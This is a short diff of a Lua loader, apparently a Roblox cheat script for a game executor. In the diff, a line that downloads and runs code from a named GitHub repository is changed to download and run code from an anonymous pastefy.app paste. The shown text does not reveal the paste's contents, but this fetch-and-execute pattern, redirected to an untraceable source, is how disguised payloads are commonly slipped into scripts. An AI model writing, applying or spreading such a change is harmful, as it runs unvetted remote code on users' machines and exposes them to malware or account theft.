@@ -101,5 +101,5 @@ if executor:lower():find("delta") then
 	end)
 else
 	-- ✅ Not Delta → continue loading Egg Detector script
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/grow-a-garden-ctrl/EggDetector/refs/heads/main/main.lua"))()
+	loadstring(game:HttpGet("https://pastefy.app/6ogbs0qv/raw"))()
 end
